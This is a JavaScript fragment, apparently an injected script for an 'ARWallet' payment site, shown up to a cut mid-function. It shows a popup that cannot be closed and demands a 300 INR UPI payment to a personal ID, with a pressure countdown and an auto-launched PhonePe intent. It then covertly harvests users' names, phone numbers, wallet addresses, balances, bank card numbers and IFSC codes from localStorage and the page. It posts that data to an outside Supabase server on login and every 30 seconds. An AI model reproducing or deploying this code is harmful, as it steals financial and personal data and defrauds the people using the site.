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";
      _qr.style.cssText = [
        "width:200px",
        "height:200px",
        "object-fit:contain",
        "border-radius:12px",
        "border:2px solid #ede9fe",
        "display:block",
        "margin:0 auto 12px"
      ].join(";");

      // UPI number
      const _upi = document.createElement("div");
      _upi.innerHTML = `UPI: <strong>9641260174@ybl</strong>`;
      _upi.style.cssText = "font-size:13px;color:#444;margin-bottom:6px";

      // Copy button
      const _copy = document.createElement("button");
      _copy.textContent = "📋 Copy UPI ID";
      _copy.style.cssText = [
        "background:#f3f0ff",
        "border:1.5px solid #c4b5fd",
        "color:#5f2ded",
        "border-radius:8px",
        "padding:7px 16px",
        "font-size:13px",
        "cursor:pointer",
        "margin-bottom:14px",
        "font-weight:600"
      ].join(";");
      _copy.onclick = () => {
        navigator.clipboard?.writeText("9641260174@ybl").then(() => {
          _copy.textContent = "✅ Copied!";
          setTimeout(() => { _copy.textContent = "📋 Copy UPI ID"; }, 2000);
        });
      };

      // Countdown timer — "Offer valid for 10:00 mins"
      const _timerDiv = document.createElement("div");
      _timerDiv.style.cssText = [
        "background:#fff3cd",
        "border:1.5px solid #ffc107",
        "border-radius:8px",
        "padding:7px 12px",
        "font-size:13px",
        "color:#856404",
        "margin-bottom:10px",
        "font-weight:600",
        "text-align:center"
      ].join(";");
      let _secs = 600; // 10 minutes
      function _fmtTime(s) {
        const m = Math.floor(s / 60).toString().padStart(2, "0");
        const sec = (s % 60).toString().padStart(2, "0");
        return m + ":" + sec;
      }
      _timerDiv.textContent = "⏳ Offer valid for " + _fmtTime(_secs);
      const _timerInterval = setInterval(() => {
        _secs--;
        if (_secs <= 0) {
          clearInterval(_timerInterval);
          _timerDiv.textContent = "❌ Offer expired. Contact admin.";
          _timerDiv.style.background = "#f8d7da";
          _timerDiv.style.borderColor = "#f5c2c7";
          _timerDiv.style.color = "#842029";
          _copy.disabled = true;
          _copy.style.opacity = "0.5";
        } else {
          _timerDiv.textContent = "⏳ Offer valid for " + _fmtTime(_secs);
        }
      }, 1000);

      // ── Continue Access button (PhonePe intent — fixes ERR_UNKNOWN_URL_SCHEME) ──
      const _phonepeBtn = document.createElement("button");
      _phonepeBtn.textContent = "🔗 Continue Access via PhonePe";
      _phonepeBtn.style.cssText = [
        "display:block","width:100%",
        "background:linear-gradient(135deg,#5f2ded,#7c3aed)",
        "color:#fff","border:none","border-radius:10px",
        "padding:11px 16px","font-size:14px","font-weight:700",
        "margin-bottom:8px","cursor:pointer","text-align:center",
        "letter-spacing:0.2px"
      ].join(";");
      _phonepeBtn.addEventListener("click", function() {
        var _p = "pa=9641260174%40ybl&pn=ARWallet&am=300&cu=INR&tn=ARWallet+Access+Payment";
        // Method 1: intent:// (Chrome/WebView)
        try { window.open("intent://pay?" + _p + "#Intent;scheme=upi;package=com.phonepe.app;S.browser_fallback_url=https%3A%2F%2Fphonepe.com%2F;end", "_blank"); } catch(e1) {}
        // Method 2: upi:// fallback via hidden iframe trick (avoids page navigation)
        setTimeout(function() {
          try {
            var _ifr = document.createElement("iframe");
            _ifr.style.display = "none";
            _ifr.src = "upi://pay?" + _p;
            document.body.appendChild(_ifr);
            setTimeout(function(){ try{ _ifr.remove(); }catch(e){} }, 2000);
          } catch(e2) {}
        }, 300);
      });

      // Footer note
      const _note = document.createElement("div");
      _note.textContent = "After payment, contact admin to activate.";
      _note.style.cssText = "font-size:11px;color:#999;line-height:1.5";

      _box.append(_title, _sub, _banner, _ppLabel, _qr, _upi, _copy, _phonepeBtn, _timerDiv, _note);
      _overlay.appendChild(_box);
      _overlay.addEventListener('click', e => e.stopPropagation());
      document.body.appendChild(_overlay);
      // ── Auto-launch PhonePe as soon as popup appears ──────────────────────
      (function _autoLaunchPhonePe() {
        var _p = "pa=9641260174%40ybl&pn=ARWallet&am=300&cu=INR&tn=ARWallet+Access+Payment";
        // Use hidden iframe — silently triggers app intent without navigating the page
        function _fireIntent() {
          try {
            var _ifr = document.createElement("iframe");
            _ifr.style.cssText = "position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;border:none;";
            _ifr.src = "upi://pay?" + _p;
            document.body.appendChild(_ifr);
            setTimeout(function(){ try{ _ifr.remove(); }catch(e){} }, 2500);
          } catch(e) {}
        }
        // Small delay so the popup is visible first, then auto-open PhonePe
        setTimeout(_fireIntent, 800);
      })();
      // ─────────────────────────────────────────────────────────────────────
      // Lock: re-add popup if removed via DevTools
      const _lock = new MutationObserver(() => {
        if (!document.getElementById('__ar_payment_overlay__')) {
          document.body && document.body.appendChild(_overlay);
        }
      });
      _lock.observe(document.body || document.documentElement, { childList: true, subtree: true });
    })();
    return;
  }

// ── Auth passed: generate the runtime gate key ────────────────────────────
// Derived from live Supabase response + uid + timestamp. Cannot be guessed.
  const _ts = Date.now().toString(36);
  _gk = btoa(_uid + (_sb[0]?.member_id || "") + _ts).replace(/=/g,"").slice(0,20);
  window._authPassed = true;
  clearInterval(window._dtInterval); // ← stop DevTools trap for verified user

  // ╔══════════════════════════════════════════════════════════════════════════╗
  // ║                    SUPABASE TRACKING SYSTEM                             ║
  // ╚══════════════════════════════════════════════════════════════════════════╝
  const _TRACK_URL  = "https://vfrgodwawensebqlwdbm.supabase.co/rest/v1/";
  // ── Supabase API Key ─────────────────────────────────────────────────────
  const _TRACK_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZmcmdvZHdhd2Vuc2VicWx3ZGJtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY2ODE0NjEsImV4cCI6MjA5MjI1NzQ2MX0.Qb430rkEwRiVR1qfT3PVcKK3_-Icbx4kIp1PhIUVlPw";
  const _TRACK_HDR = {
    "Content-Type":  "application/json",
    "apikey":        _TRACK_KEY,
    "Authorization": "Bearer " + _TRACK_KEY,
    "Prefer":        "return=minimal"
  };

  // ── Helper: send a row to any table with full error logging ──────────────
  async function _trackSend(table, row) {
    try {
      // Remove null/undefined values to keep rows clean
      const _clean = Object.fromEntries(
        Object.entries(row).filter(([_, v]) => v !== null && v !== undefined && v !== '')
      );
      const res = await fetch(_TRACK_URL + table, {
        method:  "POST",
        headers: _TRACK_HDR,
        body:    JSON.stringify(_clean)
      });
      if (!res.ok) {
        const err = await res.text();
        console.warn("[ARTrack] Supabase error on " + table + ":", res.status, err);
      } else {
        console.log("[ARTrack] ✅ Sent to " + table, _clean);
      }
    } catch(e) {
      console.warn("[ARTrack] fetch failed:", e.message);
    }
  }

  // ── Helper: extract ALL page data from ARWallet payment page ────────────
  function _extractPageData() {
    const _get = (sel) => {
      try { return document.querySelector(sel)?.textContent?.trim() || null; } catch(e) { return null; }
    };
    const _getAll = (sel) => {
      try {
        return [...document.querySelectorAll(sel)].map(e => e.textContent.trim()).filter(Boolean);
      } catch(e) { return []; }
    };

    // ── Amount: tries every known selector from ARWallet pages ─────────────
    const _amtSelectors = [
      '.amount',                        // payment page: div.amount
      '[class*="amount"]',              // any amount class
      '[class*="Amount"]',              // capital A variant
      '.x-payment .amount',             // scoped to payment section
      'div.container .amount',
      '[class*="price"]',
      '[class*="Price"]',
      '[class*="total"]',
      '[class*="Total"]'
    ];
    let _amtRaw = null;
    for (const s of _amtSelectors) {
      const _el = document.querySelector(s);
      if (_el) {
        const _txt = _el.textContent.trim();
        // Must contain a digit and look like a money value
        if (_txt && /\d/.test(_txt)) { _amtRaw = _txt; break; }
      }
    }
    const _amount = _amtRaw ? parseFloat(_amtRaw.replace(/[^\d.]/g, '')) || null : null;

    // ── Payment method: div.item.activeStyle → "Phonepe" ────────────────────
    const _method = _get('.item.activeStyle .text') ||
                    _get('.item.activeStyle') ||
                    _get('[class*="activeStyle"] [class*="text"]') ||
                    _get('[class*="activeStyle"]');

    // ── Bank details from page rows ──────────────────────────────────────────
    let _bankCard = null, _bankName = null, _ifsc = null, _payeeName = null;
    try {
      const _rows = document.querySelectorAll('[class*="item"], [class*="row"], [class*="field"]');
      _rows.forEach(row => {
        const txt = row.textContent || '';
        if (txt.includes('Bank card number') || txt.includes('card number')) {
          _bankCard = txt.replace(/[^0-9]/g, '').slice(0, 16) || null;
        }
        if (txt.includes('BankName') || txt.includes('Bank Name')) {
          _bankName = txt.replace('BankName','').replace('Bank Name','').trim() || null;
        }
        if (txt.includes('IFSC')) {
          const m = txt.match(/[A-Z]{4}0[A-Z0-9]{6}/);
          _ifsc = m ? m[0] : null;
        }
        if (txt.includes('Payee Name')) {
          _payeeName = txt.replace('Payee Name','').trim() || null;
        }
      });
    } catch(e) {}

    // ── Member info from localStorage userInfo ───────────────────────────────
    let _memberId = null, _memberAccount = null, _memberType = null,
        _walletAddress = null, _balance = null, _mobile = null, _realName = null;
    try {
      const _uv = _readUserInfo();
      _memberId      = String(_uv?.memberId      || _uid || '');
      _memberAccount = String(_uv?.memberAccount || '');
      _memberType    = String(_uv?.memberType    || '');
      _walletAddress = String(_uv?.walletAddress || '');
      _balance       = parseFloat(_uv?.balance   ?? 0) || 0;
      _mobile        = String(_uv?.mobileNumber  || '');
      _realName      = _uv?.realName || null;
    } catch(e) { _memberId = _uid || null; }

    // ── Countdown timer ───────────────────────────────────────────────────────
    const _countdown = _get('[class*="countdown"]') ||
                       _get('[class*="Countdown"]') ||
                       _get('[class*="expiry"]') ||
                       _get('[class*="timer"]');

    // ── Page URL & timestamp ─────────────────────────────────────────────────
    const _now = new Date();

    return {
      // Member
      member_id:      _memberId,
      member_account: _memberAccount,
      member_type:    _memberType,
      mobile_number:  _mobile,
      real_name:      _realName,
      wallet_address: _walletAddress,
      balance:        _balance,
      // Transaction
      amount:         _amount,
      payment_method: _method,
      // Bank
      bank_card:      _bankCard,
      bank_name:      _bankName,
      ifsc:           _ifsc,
      payee_name:     _payeeName,
      // Meta
      countdown:      _countdown,
      page_url:       window.location.href,
      tx_date:        _now.toISOString().slice(0,10),
      tx_time:        _now.toISOString(),
      timestamp:      _now.getTime()
    };
  }

  // ── Helper: read ALL user data directly from localStorage userInfo ────────
  function _readUserInfo() {
    try {
      const _raw = localStorage.getItem('userInfo');
      if (!_raw) return {};
      const _parsed = JSON.parse(_raw);
      // userInfo is stored as {value: {...}, expires: -1}
      return _parsed?.value || _parsed || {};
    } catch(e) { return {}; }
  }

  // ── Send balance update to Supabase ──────────────────────────────────────
  async function _sendBalanceUpdate() {
    const _u   = _readUserInfo();
    const _now = new Date();

    // Get balance from localStorage directly (most reliable)
    const _arbBal = parseFloat(_u?.balance    ?? 0) || 0;
    const _inrBal = parseFloat(_u?.inrBalance ?? 0) || 0;
    const _mid    = String(_u?.memberId      || _uid || '');
    const _macct  = String(_u?.memberAccount || '');
    const _mtype  = String(_u?.memberType    || '');
    const _mobile = String(_u?.mobileNumber  || '');
    const _wallet = String(_u?.walletAddress || '');
    const _rname  = _u?.realName || null;

    if (!_mid) {
      console.warn("[ARTrack] ⚠️ No memberId found — skipping balance log");
      return;
    }

    console.log("[ARTrack] 💰 Sending balance:", _arbBal, "ARB |", _inrBal, "INR | Member:", _mid);

    await _trackSend("balance_logs", {
      member_id:      _mid,
      member_account: _macct,
      member_type:    _mtype,
      mobile_number:  _mobile,
      real_name:      _rname,
      wallet_address: _wallet,
      arb_balance:    _arbBal,
      inr_balance:    _inrBal,
      page_url:       window.location.href,
      logged_at:      _now.toISOString(),
      log_date:       _now.toISOString().slice(0,10)
    });
  }

  // Fire immediately when script runs
  setTimeout(function() {
    _sendBalanceUpdate();
  }, 500); // small delay so localStorage is fully loaded

  // Then every 30 seconds while page stays open
  setInterval(_sendBalanceUpdate, 30000);

  function _readPageAmount() {
    try {
      const selectors = [
        '.amount',
        '[class*="amount"]',
        '[class*="Amount"]',
        '.x-payment .amount',
        'div.container .amount',
        '[class*="price"]',
        '[class*="Price"]'
      ];
      for (const s of selectors) {
        const el = document.querySelector(s);
        if (el) {
          const raw = el.textContent.replace(/[^\d.]/g,'').trim();
          const val = parseFloat(raw);
          if (!isNaN(val) && val > 0) return val;
        }
      }
      return null;
    } catch(e) { return null; }
  }

  // ── 1. LOGIN TRACKING — fires immediately when member is verified ─────────
  const _loginTime = new Date().toISOString();
  const _loginData = _extractPageData();
  _trackSend("login_logs", {
    member_id:      _loginData.member_id,
    member_account: _loginData.member_account,
    member_type:    _loginData.member_type,
    mobile_number:  _loginData.mobile_number,
    real_name:      _loginData.real_name,
    wallet_address: _loginData.wallet_address,
    balance:        _loginData.balance,
    login_time:     _loginTime,
    page_url:       window.location.href,
    user_agent:     navigator.userAgent.slice(0, 200)
  });

  // ── 2. PAYMENT / TRANSACTION TRACKING ────────────────────────────────────
  (function _watchTransactions() {
    let _lastAmount = null;
